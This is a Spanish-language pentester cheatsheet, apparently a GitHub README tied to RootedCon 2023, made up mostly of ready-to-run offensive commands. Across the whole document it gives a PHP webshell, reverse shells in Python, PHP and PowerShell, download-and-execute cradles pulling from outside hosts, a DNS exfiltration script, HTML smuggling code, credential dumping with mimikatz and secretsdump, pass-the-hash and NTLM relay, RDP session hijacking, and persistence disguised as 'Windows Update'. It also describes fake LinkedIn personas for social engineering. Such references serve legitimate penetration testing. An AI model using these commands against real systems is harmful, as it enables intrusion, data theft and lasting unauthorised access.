# Pentester-Cheatsheet-RootedCon2023

# Introducción

<img width="582" alt="image" src="https://user-images.githubusercontent.com/101278218/223761519-e255576b-0cdd-44ff-b8e1-12f8056117f4.png">


# **Tunelización**
**proxychains**
   Escaneo de la máquina local sobre la que se ha realizado el túnel `proxychains nmap -sT -F -sV 127.0.0.1`
    
-   Conexión RDP al sistema hacia el que apunta el túnel `proxychains rdesktop 127.0.0.1:3389`
    
-   Conexión SMB a controlador de dominio con usuario domain admin `proxychains smbclient -U \\ \\\\\\c$ U`
- Túnel de PC a Servidor 1: `ssh -D [puerto loca]> [usuario-s1]@[IP servidor1]`
- Redirección de tráfico mediante proxychains 
- Uso del puerto local puesto a la escucha 
	- `cp /etc/proxychains.conf ./` 
	- `nano proxychains.conf` (cambiar la última línea - puerto local a la escucha) 
	- `proxychains [comando]`
- **Encadenamiento de túneles SSH**
- Túnel de Kali a Servidor 1:
    `ssh -L [puerto local]:127.0.0.1:[puerto VPS] [usuario-s1]@[IP servidor1]`

- Túnel de Servidor 1 al Servidor 2 (reutilizando conexión abierta):
    `ssh -D [puerto VPS] [usuario-s2]@[IP servidor2]`

Creación de túneles con 2 VPS diferentes
- Habilitación del servicio TOR:
`service tor start`
- Editar el archivo para usar proxychains mediante TOR
`nano proxychains.conf` (cambiar la última línea - `socks5 127.0.0.1 9050`)
- Creación de túnel SSH mediante TOR:
`proxychains ssh -D [puerto local] [usuario]@[IP servidor]`

## Reconocimiento
**Identificación de sistemas autónomos**
 - Consultas directas a RIRs: whois.arin.net u otros 
- BGP Hurricane: http://bgp.he.net/

Si bien servicios como BGP son útiles y se encuentran actualizados, también se pueden hacer búsquedas para identificar los sistemas autónomos directamente sobre los RIRs correspondientes.
`whois -h whois.arin.net "a [ASN]" | grep -Eo "([0 9.]+){4}/[0 9]+"`

**Identificación de rangos de red**
Para ello se puede hacer uso de diferentes servicios y herramientas como:
- WhoisXMLapi: https://ip-netblocks.whoisxmlapi.com/api
- Herramienta Amass (https://github.com/OWASP/Amass)

`amass intel -org [organizacion]`

**Identificación de dominios**
- Identificación mediante Reverse DNS (WhoisXMLapi) 
-  Identificación mediante por registrador WHOIS (WhoisXMLapi - Reverse WHOIS) 
- Identificación mediante compartición de NS y MX (ViewDNS) 
-  Identificación mediante la resolución inversa de direcciones IP 
-  Identificación mediante Google Hacking (u otros buscadores)
- Reverse NS: https://viewdns.info/reversens/ 
- Reverse MX: https://viewdns.info/reversemx/

**Identificación de subdominios**
- Identificación de subdominios, mostrando la fuente: `amass enum -d [dominio] -src`
 - Identificación de subdominios de forma pasiva, mostrando la fuente:
`amass enum -passive -d [dominio] -src`

en shodan mediante el operador de búsqueda ssl: podemos buscar certificados de subdominios para un dominio dado, permitiendo identificar tanto subdominios como activos en Cloud.

Github: https://github.com/tnt1200/subscan 
Diccionario recomendado:https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomainstop100000.txt
SecurityTrails:https://securitytrails.com/list/apex_domain/[dominio]

**Identificación de infraestructura en Cloud**
https://github.com/initstring/cloud_enum

herramientas adicionales tales como CloudScrapper , LazyS3, GCPBucketBrute, aunque Cloud_enum destaca por identificar tanto activos en AWS, Azure o Google.

**Búsqueda de información expuesta en Internet**
búsqueda de posibles leaks: https://cse.google.com/cse/publicurl?cx=012209864558240645678:pownmejpj5w

Encontrar sitios web descentralizados
`site:[domain] ext:php` (cambiar con asp,aspx,jsp...)

Existen multitud de servicios que permiten obtener esta información, tales como: 
https://breachdirectory.org/ 
https://dehashed.com/ 
https://intelx.io/

ver webs obsoletas o con mala pinta
`eyewitness -f --web --prepend-https`

**Análisis de vulnerabilidades**
https://github.com/projectdiscovery/nuclei

## Reconocimiento para el uso de ing. social
Crear linkedin falso
persona que no existe: https://thispersondoesnotexist.com/
sacar mails corporativos
https://github.com/vysecurity/LinkedInt
https://hunter.io/

## Ataques en perímetro
Top priorizar:
 1. File Upload para la subida de reGeorg y acceso a red interna  
 2. SQL Injection para la lectura de información que pueda ser reutilizada o ejecución de comandos 
  3. Deserialización / RCE para la ejecución de comandos 
  4.  XXE para la lectura de ficheros
5. Fuerza bruta en anchura contra empleados a través de aplicaciones corporativas (VPN, Citrix, ) 
6. XSS en aplicaciones relevantes para el robo de sesiones de empleados.

**Subida de ficheros**
Ejemplo de webshell simple: 
`<?php system($_GET['cmd']); ?>`

 - Weevley
    - Generación de Webshell
`weevely generate [clave] [output]`
    - Conexión de weevely con la Webshell subida
`weevely [URL del archivo subido] [clave]`

**Conexiones inversas**
- Python:
`python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[puer
to]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- PHP:
`php -r '$sock=fsockopen("[IP]",[puerto]);exec("/bin/sh -i [&3 ]&3 2]&3");'`
- Powershell:
`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.9.254.6/test.ps1')"`

Más ejemplos en:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

**Pivoting a través de reGeorg y NeoReGeorg**

Subida del recurso al servidor y verificación de accesibilidad (obtención de mensaje)
- Ejecución del cliente en la máquina atacante:
`python reGeorgSocksProxy.py -u [URL completa] -p [puerto local]`
- Uso de proxychains para pivotar: `proxychains [binario]`
Para evitar posibles problemas es recomendable modificar reGeorg cambiando el mensaje al menos.
Recurso reGeorg: https://github.com/sensepost/reGeorg
Alternativa: https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md

Generación y conexión en base a plantilla proporcionada (ej: error web o 404)
`python neoreg.py generate -k [clave] --file 404.html`
`python neoreg.py -k [clave] -u [URL] --skip`
- Definición de una cookie para validar el acceso:
`python neoreg.py -k [clave] -u [URL] -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie
"key=value;key2=value2"`
- Uso de diferentes archivos (Memory-webshell):
$ python neoreg.py -k [clave] -u [url_1] -u [url_2] -u [url_3] ...

**Exfiltración mediante DNS**
En estos casos se puede hacer uso de herramientas como DNScat (o de forma manual) para establecer un túnel con el atacante mediante el uso del protocolo DNS. Se muestra un simple script para enviar la información vía DNS de forma asíncrona:
`[comando] | xxd -ps -c 200 | tr -d '\n' > out.txt 
i=$(wc -c out.txt | cut -d " " -f1) 
for ((j=0;$i>=0;j++)); 
do x=$(tail -c $i out.txt); 
y=$(echo $x | head -c 60); 
dig @ -p 5053 +short -x $y.; i=$(expr $i - 60); done;
i=$(expr $i - 60); done;`

El mismo script podría modificarse para que acepte los parámetros necesarios como argumentos, de tal forma que pudiera ser subido al servidor y ejecutado cada vez. Importante revisar permisos al subirlo. 
`rm /tmp/out.txt $1 | xxd -ps -c 200 | tr -d '\n' > /tmp/out.txt 
i=$(wc -c /tmp/out.txt | cut -d " " -f1) 
for ((j=0;$i>=0;j++)); 
do x=$(tail -c $i /tmp/out.txt); 
y=$(echo $x | head -c 60); 
dig @$2 -p 5053 +short -x $y.exil.com; 
i=$(expr $i - 60); done;`

Para poder capturar las consultas realizadas se puede hacer uso del siguiente simple servidor DNS: https://gist.github.com/andreif/6069838
- Ejecución del script (corre en el puerto 5053) `$ python dns.py >> out.txt `
- Obtención de subdominios capturados `$ cat out.txt | grep "Reply" -A 4 | grep "IN" | cut -d ";" -f2 | cut -d "." -f3 | xxd -r -p`

**Ataques de fuerza bruta en anchura**
En empresas grandes es fácil encontrar empleados con claves que siguen patrones predecibles como 2019 19. etcétera. Para explotar esta debilidad se pueden realizar las siguientes acciones: 
- Identificación de matrículas de empleados o direcciones de correo 
- Identificación de sistemas sin doble factor de autenticación (auth. contra el dominio interno) 
- Pruebas (1 o 2 al día) contra el listado completo de usuarios obtenido

Uno de los servicios que raras veces tiene doble factor es el correo. Ejemplo de fuerza bruta: 
`ruler -k --domain brute --users users --passwords passwords --verbose`

**Registro de dominio interno en Internet**
En caso de que durante el análisis de información en Internet, o gracias al acceso a algun entorno corporativo, haya sido posible obtener un nombre de dominio interno, es necesario comprobar que este esté registrado. Muchas empresas hacen uso de dominios con TLDs públicos, y en ocasiones estos dominios de uso interno no se registran en Internet.
 Se puede aprovechar de esta vulnerabilidad, registrando el dominio en Internet y redirigiendo todas las peticiones a un servidor que tenga a la escucha una herramienta como Responder (se verá más adelante). Esto no puede permitir la captura de claves en texto claro y principalmente hashes NetNTLMv2 que pueden ser posteriormente crackeados
 
**Ejecución de binario a través de ruler**
Comprobación de reglas: `ruler -k --verbose --email @ -u -p display `
- Creación de regla: `ruler -k --verbose --email @ -u -p add --location '\\\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell `
- Eliminación de regla: `ruler -k --verbose --email @ -u -p delete --name maliciousrule `

Cabe destacar que acepta tanto el uso de clave como hash del usuario

**Remote Template Injection**
https://github.com/JohnWoodman/remoteinjector
`python remoteinjector.py -w [URL .dotm malicioso] [archivo]`

**HTML Smuggling**

    <html>
    <head>
    <title>HTML Smuggling</title>
    </head>
    <body>
    <p>This is all the user will see...</p>
    <script>
    function convertFromBase64(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array( len );
    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    return bytes.buffer;
    }
    var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
    var data = convertFromBase64(file);
    var blob = new Blob([data], {type: 'octet/stream'});
    var fileName = 'test.txt';
    if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
    else {
    var a = document.createElement('a');
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
    }
    </script>
    </body>
    </html>

## Ataques mediante Wi-Fi
Se muestran a continuación las vulnerabilidades más habituales según el tipo de red: 
- Open: Evasión de medidas de seguridad y visibilidad interna / ataques contra clientes. 
- WEP: Posibilidad de romper la clave con paquetes.
- WPA/WPA2 (PSK): Captura Handshake o PMKID (1º paquete) y recuperación de la clave. 
- WPA/WPA2 (Entreprise): Captura de credenciales/hashes de usuario internos. 
- WPS: Fuerza bruta al PIN si no tiene protección. 
- Ataques contra clientes: Creación de puntos de acceso falsos. Esto mejora con el uso de técnicas de ingeniería social previas tales como llamadas telefónicas, correos, etcétera.

**PatataWifi**
Esta herramienta permite automatizar el desarrollo de ataques contra redes que hagan uso de infraestructura WPA2-Entreprise. Github: https://github.com/jesux/PatataWiFiEnterprise Pasos a seguir: 
- Quemar la ISO en una tarjeta SD 
- Al iniciar ejecutar 'raspi-config' o '/usr/lib/raspi-config/init_resize.sh' y expandir el tamaño de la partición. 
- Verificar el acceso con los usuarios :patatas123 y :patatas123 
- Modificar la configuración en el archivo default.sh para establecer la red a suplantar 
- Las herramientas se lanzan en tmux, hay que usar 'tmux attach' para acceder (ctrl+b + d para salir) 
- Se puede acceder a través de ethernet por la IP 192.168.1.100 o por la que asigna el DHCP 
- La raspberry crea la red X Secure-MGMT- con clave 333 
- Conexión desde la red Wi-Fi a la IP por defecto 172.31.0.1

## Intrusion Física

**Acceso a sistemas mediante Kon-boot**

## PrivEsc - Windows/Linux
Windows:
https://github.com/GhostPack/Seatbelt https://raw.githubusercontent.com/neox41/WinEnum/master/WinEnum.bat https://fareedfauzi.gitbook.io/oscp-notes/windows-post-exploitation/automated-enumeration-script
Linux:
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

**Windows**
 - Unquoted Service Path
- Permisos inseguros en servicios 
- Permisos inseguros en binarios (de servicios) 
- Hijacking de DLLs 
- Allways Install Elevated 
- UAC Bypass

Hijack DLL:
Cuando un proceso busca una DLL el sistema realiza la búsqueda en las siguientes localizaciones:
- Directorio desde donde se ejecuta la aplicación. 
- Directorio de Windows 32 
- Directorio de Windows System 
- Directorio de instalación de Windows :\ 
- El directorio actual de trabajo (CWD) 
- Directorios incluidos en el PATH del sistema 
- Directorios incluidos en el *PATH del usuario*

Hijacking DLL del proceso IKE: https://raw.githubusercontent.com/itm4n/Ikeext-Privesc/master/Ikeext-Privesc.ps1 Invoke-IkeextCheck Invoke-IkeextExploit -Verbose 
El exploit está predefinido para realizar la siguiente acción: net user hacker SuperP@ss123 /ADD

**Allways Install Elevated**
 - C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
 - C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

**Bypass UAC**
https://github.com/hfiref0x/UACME
 https://lolbas-project.github.io/
 
- **CompMgmtLauncher**
	- Un ejemplo ampliamente utilizado ha sido CompMgmtLauncher.exe, el cual permite hacer bypass de UAC en sistemas Windows 7, 8 y 8.1. Sabiendo que cuenta con una vulnerabilidad DLL Hijacking, se puede comprobar con sigcheck.exe que tiene la funcionalidad AutoElevate habilitada
	- 
PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc/PowerUp.ps1
PS> Invoke-AllChecks
SharpUp:
https://github.com/GhostPack/SharpUp 
C:\> SharpUp.exe audit

**Identificación de vulnerabilidades en el sistema**
Windows Exploit Suggester (Next Gen.) https://github.com/bitsadmin/wesng 
Sherlock / Watson script (Powershell) https://github.com/rasta-mouse/Sherlock 
PS> Get-InstalledSoftware PS> Find-AllVulns

## Obtención de credenciales

Copiado manual de SAM y SYSTEM para su posterior unificación con: 
C:\> reg save HKLM\sam SAM 
C:\> reg save HKLM\system SYSTEM $ impacket-secretsdump -sam sam.save -system system.save LOCAL

    impacket-secretsdump <dominio>\<usuario>:<clave>@<IP objetivo>
Utilizar herramientas nativas antes que herramientas externas:

    C:\> procdump.exe -accepteula -ma lsass.exe .dmp
    
    Administrador de Tareas -> Detalles -> Crear archivo de volcado

**Data Protection API (DPAPI)**
Vaults contiene registros de claves cifradas y referencia a los blobs cifrados. 
Windows tiene dos Vaults : Credenciales web (almacena credenciales del navegador) y Credenciales de Windows (almacena credenciales guardadas por mstsc u otros). Credentials es el blob de credenciales cifrado real. Esta información siempre se encuentra almacenada de forma cifrada en: C:\Users\\AppData\Local\Microsoft\Credentials

    mimikatz # vault::list
    C:\> Seatbelt.exe WindowsCredentialFiles

Local con privilegios: 

    mimikatz # sekurlsa::dpapi 

Sin privilegios y contra dominio: 

    mimikatz # dpapi::masterkey
    /in:C:\Users\[usuario]\AppData\Roaming\Microsoft\Protect\[SID]\[GUID] /rpc

    mimikatz # dpapi::cred /in:C:\Users\[usuario]\AppData\Local\Microsoft\Credentials\[Vault]
    /masterkey:[masterkey]

**Spoofing de servicios en red - Responder**
Versión en Kali (también hay versión Python): 

    $ responder -I eth0 -w

 
Versión en Powershell que requiere de privilegios 

    PS> Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y

Los ficheros .scf pueden cargar el icono de otro equipo. Si este fichero está en un recurso compartido accesible por los usuarios, cualquiera que visite el recurso compartido realizará una petición al equipo del atacante y dejará su hash. 
Contenido fichero:

    [Shell] 
    Command=2 
    IconFile=\\\share\test.ico 
    [Taskbar] 
    Command=ToggleDesktop

## Password Cracking
Principalmente podemos diferencias los siguientes tipos de situaciones para crackear un hash: 
- Wordlist 
- Wordlist + rules 
- Masks 
- Combinator 
- Hybrid

hashcat -a 0 -m 1000 <archive hashes> /usr/share/wordlists/rockyou.txt -d 1
Diccionarios: https://github.com/danielmiessler/SecLists/tree/master/Passwords
hashcat -a 0 -m 1000 <archive hashes> dic -d 1 -r rules -r rules2
● Archivo rules: c
● Archivo rules2: $2$0$2$2
$ hashcat -a 3 -m 1000 <archive hashes> -d 1 ?u?l?l?l?l?l?d?d?d?d
** -a 3 indica el modo masks
● Mascaras combinadas:
$ hashcat -a 3 -m 1000 <archive hashes> -d 1 -1 ?u?l ?1?l?l?l?l?l?d?d?d?d
Ejemplo simple: hashcat -a 3 -m 1000 <archive hashes> -d 1 ?u?l?l?l?l?l?d?d?d?d
● Ejemplo incremental: hashcat -a 3 -m 1000 <archive hashes> -d dic.hcmask
● Contenido de dic.hcmask:
Rooted?d
Rooted?d?d
Rooted?d?d?d
Rooted?d?d?d?d
hashcat -a 6 -m 1000 -d 1 ntlm dic ?d?d?d?d
● Contenido de dic:
Rooted
testing
pruebas
hola

Paso 2: Preparación del entorno
En base al tipo de escenario se deberá descargar los diccionarios necesarios. 

Un ejemplo de
diccionario muy amplio sería el siguiente, una versión actualizada y mucho más completa de claves
posibles respecto del típico rockyou.txt (92GB vs 133MB).
https://weakpass.com/wordlist/1851
En base a la gran capacidad de computación con la que se cuenta, se puede hacer uso de diccionarios
de reglas para ampliar el alcance. 

En este sentido se recomienda el siguiente repositorio, que contiene
OneRuleToRuleThemAll una combinación de 52.000 mutaciones para cada clave que se pruebe del
diccionario.
https://github.com/NotSoSecure/password_cracking_rules
Para finalizar será necesario descargar hashcat, o usar directamente la versión Docker preparada:
https://github.com/javydekoning/docker-hashcat

En base a diccionarios - Versión simple (13GB):
https://download.weakpass.com/wordlists/1851/hashesorg2019.gz

    $ gunzip hashesorg2019.gz

    $ hashcat -m 5600 -a 0 hashes.txt hashesorg2019 -w 4 -d 1

En base a diccionarios - Versión full (>100GB):
https://download.weakpass.com/wordlists/1948/weakpass_3a.7z

    $ 7z e weakpass_3a.7z -bsp1 # Para ver el progreso

    $ hashcat -m 5600 -a 0 hashes.txt weakpass_3a -w 4 -d 1

En base a reglas - Versión simple con OneRule:
$ wget
https://github.com/NotSoSecure/password_cracking_rules/raw/master/OneRuleToRuleThemAll.rule

    $ hashcat --force words.txt -r OneRuleToRuleThemAll.rule --stdout > hashcat_words.txt
    $ hashcat -m 5600 -a 0 hashes.txt hashcat_words.txt

En base a reglas - OneRule + mascaras:

    $ hashcat -m 5600 -a 6 hashes.txt hashcat_words.txt ?d?d?d?d -w 4 -d 1

En base a mascaras Caracteres especiales y mínimo de 7:

    $ hashcat -w 4 -m 5600 -a 3 hashes.txt -1 ?l?u -2 ?l?d??'-_.!@#$%&' ?1?2?2?2?2?2?2?2?2?2 --increment
    -d 1 -o results.txt --increment-min 7

En base a mascaras Caracteres especiales reducidos y mínimo de 8:

    $ hashcat -w 4 -m 5600 -a 3 hashes.txt -1 ?l?u -2 ?l?d??'-_.!$' ?1?2?2?2?2?2?2?2?2?2 --increment --force
    -o results.txt --increment-min 8

En base a mascaras Caracteres especiales base y mínimo de 9:

    $ hashcat -w 4 -m 5600 -a 3 hashes.txt -1 ?l?u -2 ?l -3 ??'-_.!$' ?1?2?2?2?2?2?2?2?2?3 --increment --
    force -o results.txt --increment-min 9

## Movimiento lateral y pivoting
 - Credenciales: Se conoce un par de usuarios y contraseña de algún usuario. 
 - Sesión Actual: Se cuenta con una sesión ya iniciada, o sobre la que se tiene ejecución de comandos. 
 - Pass-the-Hash: Se dispone de un Hash LM:NTLM, y la autenticación NTLM está habilitada. 
 - Overpass-the-Hash: Se dispone de un Hash LM:NTLM aunque la autenticación en la infraestructura interna se realiza mediante Kerberos. 
 - Tickets: Se dispone de un ticket TGT de algún usuario interno.

Escritorio Remoto de Windows

    C:\> mstsc.exe

PsExec indicando usuario y contraseña

    C:\> PsExec.exe \\[hostname] -u [usuario] -p [clave] cmd

Enter-PSSession indicando usuario y contraseña

    PS> Enter-PSSession -ComputerName [hostname] -Credential (Get-Credential)

Uso de WMI nativo (no se obtiene la salida)

    C:\> wmic /node:[hostname] /user:[usuario] /password:[clave] process call create "cmd.exe /c
    [comando]"

Uso de script PS para establecer una conexión mediante DCOM

    PS> Invoke-DCOM -ComputerName [ip]' -Method MMC20.Application -Command [comando]"

Terminal de otro equipo mediante PsExec 

    C:\> psexec.exe \\ cmd.exe 

Acceso a otro equipo con Powershell (versiones nuevas) 

    PS> Enter-PSSession -ComputerName

**PassTheHash**
Acceso por RDP (no puede estar NLA habilitado)

    $ xfreerdp /u:[user] /d:[dominio] /pth:[hash] /v:[ip]

Acceso por consola mediante SMB:

    $ impacket-smbexec [dominio]/[usuario]@[ip] -hashes [LM:NTLM]

Acceso por consola mediante WMI:

    $ impacket-wmiexec [dominio]/[usuario]@[ip] -hashes [LM:NTLM]

Acceso con Powershell mediante SMB (Invoke-TheHash)

    PS> Invoke-TheHash -Type SMBExec -Target [ip/CIDR] -Domain [dominio] -Username [user] -Hash
    [NTLM]

**OverPass-the-Hash**
Overpass the hash con mimikatz

    C:\> sekurlsa::pth /user:<usuario> /domain:[FQDN dominio] /ntlm:[hash NTLM]

**PassTheTicket**
Exportación de tickets:
mimikatz # sekurlsa::tickets /export
Revisión de ticket Kerberos:

    C:\> dir | findet "Administrator" | findstr "krbtgt"

Uso de Pass-the-ticket:

    (base) mimikatz # kerberos::ptt [archivo ticket]
    mimikatz # kerberos::ptt [0;3e4]-2-0-60a10000-SERVER2008$@krbtgt-ROOTED.local.kirbi

Verificación mediante el acceso a recurso SMB:

    C:\> dir \\[IP objetivo]\admin$

## Pivoting interno
**NTLMrealy**
Se pone el scritp ntlmrelayx a la escucha del hash: `$ impacket-ntlmrelayx -t -c` 
Ejemplo de ejecución: `$ impacket-ntlmrelayx -t 192.168.0.167 -c 'net user NtlmRelay Abc123.. /add` 
Envío del hash mediante el acceso a SMB, RDP,

**Robo de sesión**
Revisión de las sesiones activas: `C:\> query user` 
PM >adminLocal rdp-tcp#55 2 Active . 10/12/2017 6:33 PM
Creación del servicio para el secuestro de la sesión: 
`C:\> sc create secuestro binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"` 
Ejecución del servicio y secuestro: `C:\> net start secuestro`

**Redirección de puertos**
Para sistemas Windows:

    C:\> netsh firewall add portopening tcp [puerto] lt enable all

    C:\> netsh interface portproxy add v4tov4 listenport=[puerto escucha] listenaddress=[IP Windows]
    connectport=[puerto objetivo] connectaddress=[maquina objetivo]

    C:\> netsh interface portproxy show v4tov4

    C:\> netsh interface portproxy delete v4tov4 listenport=[puerto escucha] listenaddress=[IP
    Windows]

Para sistemas Unix:

    $ ssh -L [puerto local]:[IP objetivo]:[puerto objetivo] [usuario]@[IP]

Meterpreter

    run autorute -s [10.10.10.0/24]
    
**Servidores MSSQL**
Al igual que se comentó el uso de PowerUpSQL para la elevación de privilegios en estos entornos, el script tambien cuenta con cmdlets específicos para la identificación de estos sistemas. 

    Get-SQLInstanceDomain 
    Get-SQLInstanceBroadcast 
    Get-SQLInstanceScanUDP

Toda la información de PowerUpSQL: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet 
Automatización para múltiples servidores SQL: `PS> Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`

**Conexión a servidor MSSQL**
Mediante PowerUpSQL:

    PS> Get-SQLQuery -Instance [FQDN SQL],1433" -Query "select @@servername

Mediante Impacket:

    $ impacket-mssqlclient -windows-auth [Dominio]/[usuario]@[IP] -debug

**xp_cmdshell**
Inicialmente por lo tanto será necesario identificar el estado en el que se encuentra dicho procedimiento: `SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell`
Si el procedimiento se encontrara deshabilitado, se puede habilitar con el siguiente conjunto de consultas 
`SQL: sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;` 
Posteriormente se puede llamar al procedimiento para la ejecución de comandos: 
`EXEC xp_cmdshell 'whoami ;` Este mismo proceso podría desarrollarse con scripts de PS como el siguiente: `PS> Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults`

**Movimiento lateral mediante Linked Servers**

Para identificar los servidores enlazados:

    SELECT * FROM master..sysservers;
    SELECT * FROM OPENQUERY("sql-2.silentforce.io", 'select @@servername ;
    SELECT * FROM OPENQUERY("sql-2.silentforce.io", 'SELECT * FROM sys.configurations WHERE name
    = ''xp_cmdshell ;

Si RPC Out está habilitado se habilita XP_cmdshell:

    EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [SQL server]
    EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [SQL server]

Con PowerUPSQL:

    PS> Get-SQLServerLinkCrawl -Instance "srv-1.dev.silentforce.io,1433"

**Reconocimiento del Directorio Activo**
Mediante ADUC:
Se puede ejecutar ADUC desde mediante el binario dsa.msc : `C:\> dsa.msc` Remarcar que también es posible abrir ADUC con permisos diferentes al usuario que esté siendo utilizado mediante runas. Se muestra a continuación un simple ejemplo: `C:\> runas /netonly /user:\ "mmc dsa.msc"` 
Tras acceder al Directorio Activo se puede hacer un análisis de todas las condiciones como son listado de usuarios, grupos, equipos, recursos compartidos, relaciones de confianza entre los dominios, detección de domain admins, etcétera

Con AdExplorer parseamos datos:
Repositorio: https://github.com/c3c/ADExplorerSnapshot.py Ejecución: `$ python3 ADExplorerSnapshot.py [archivo].dat`

## Compromiso de la infraestructura interna
Kerberoasting
ASREPRoasting
Unconstrained Delegation
Contrained Delegation
Linux Credential Cache 
Discretionary ACLs
Relaciones de confianza

**Kerberoasting**
Solo requiere de un usuario del dominio (aunque tenga privilegios nulos) 
 - Se aprovecha de una funcionalidad legítima que rara vez está monitorizada 
 - Muchos de los usuarios que se obtienen son privilegiados ya sea del dominio o una máquina concreta 
 - Estos usuarios al no se personales puede tener credenciales débiles y predecibles 

El ataque se basa en hacer una petición con el usuario valido de todos los tickets de servicio de las diferentes cuentas de servicio existentes en el directorio activo (SPNs). Los tickets que son recuperados se encuentran siempre cifrados con el hash NTLM de la contraseña de la cuenta de servicio.

Desde Linux mediante el uso del framework Impacket: `$ impacket-GetUserSPNs -request / -dc-ip` 
Desde Windows mediante Rubeus (y el usuario autenticado) `C:\> Rubeus.exe kerberoast`

**Asreproasting**
Identificación de usuarios con Impacket: 

    $ impacket-GetNPUsers -request [dominio]/[user] -dc-ip 

Petición del Ticket con Rubeus: 
`C:\> rubeus.exe asreproast ASREPRoasting` 
En caso de lanzar Rubeus con la opción asreproast sin definir usuario, devolvería todos los usuarios que no cuentan con una pre-autenticación configurada.

**Discretionary ACLs**

Mediante BloodHound: `MATCH (g1:Group), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p MATCH (g1:Group {name: "}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p` 
Mediante PowerView: 

    PS> Get-DomainObjectAcl -SearchBase "CN=Users,DC=,DC=,DC=" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier - match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
    
Algunos de los principales permisos que suelen buscarse son: 
 - GenericAll: Permisos completes (añadir un usuario a un grupo o cambiarle la clave). 
 - GenericWrite: Capacidad para actualizar los atributos de un objeto (ej: logon script). 
 - WriteOwner: Capacidad para cabiar el propietario y obtener control complete. 
 - WriteDACL: Capacidad para modificar los ACEs y dotar al usuario de completes privilegios. 
 - AllExtendedRights: Capacidad para añadir un usuario a un grupo o cambiarle la clave. 
 - ForceChangePassword: Capacidad para cambiar la clave del usuario. 
 - Self (Self-Membership): Posibilidad de añadir el propio usuario a un grupo

## Persistencia
HKCU / HKLM Registry Autoruns 
Scheduled Tasks 
Startup Folder

**Configuración en el arranque (StartUp)**
 Mediante la modificación del registro de Windows es posible establecer el binario que debe iniciarse
durante el arranque del sistema.
Creación de regla para la ejecución en el arranque:

    C:\] reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [nombre] /t REG_SZ /d
    [binario] /f

Eliminación de regla:

    C:\] reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v [nombre]

Cabe destacar que existen diferentes rutas que pueden ser utilizadas para esta labor:

    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

También se puede configurar el arranque mediante el despliegue del binario en la siguiente ruta:

    C:\Users\[usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
   
**Configuración mediante tarea programada**
Se trata de una herramienta nativa de Windows y cuyo uso es bastante simple. 

    C:\> schtasks /create /ru "SYSTEM" /sc minute /mo /tn "" /tr ""

 
Ejemplo de uso para la conexión inversa a través de certificado cada 10 minutos: 
`C:\> schtasks /create /ru "SYSTEM" /sc minute /mo 10 /tn "Windows Update" /tr "C:\temp\plink.exe 10.1.1.22 -P 443 -C -R 3445:127.0.0.1:445 -N -l root -i private.key"` 

Se puede establecer una variable que no sea fija para el periodo de conexión, de cara a hacer más compleja la detección de la tarea.

**Conexión directa**
Se muestran a continuación las acciones necesarias para configurar una conexión directa al VPS
Creación de túnel directo al servidor VPS mediante usuario y contraseña

    C:\> plink.exe [IP VPS] -P [puerto SSH] -C -R [puerto VPS]:127.0.0.1:[puerto cictima] -l [usuario] - pw [clave]

Creación de túnel directo, sin shell (-N) y mediante clave privada (-i)

    C:\> plink.exe [IP VPS] -P [puerto SSH] -C -R [puerto VPS]:127.0.0.1:[puerto cictima] -N -l [usuario]
    -i "[ruta clave priv.]"

Túnel al VPS y posterior uso de proxychains

    $ ssh -D [puerto] [usuario VPS]@[IP VPS] -o 'IPQoS=lowdelay throughput'

**Automatización mediante SharPersist**

Descarga de paylaod y transformación a Base64:

    PS > $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
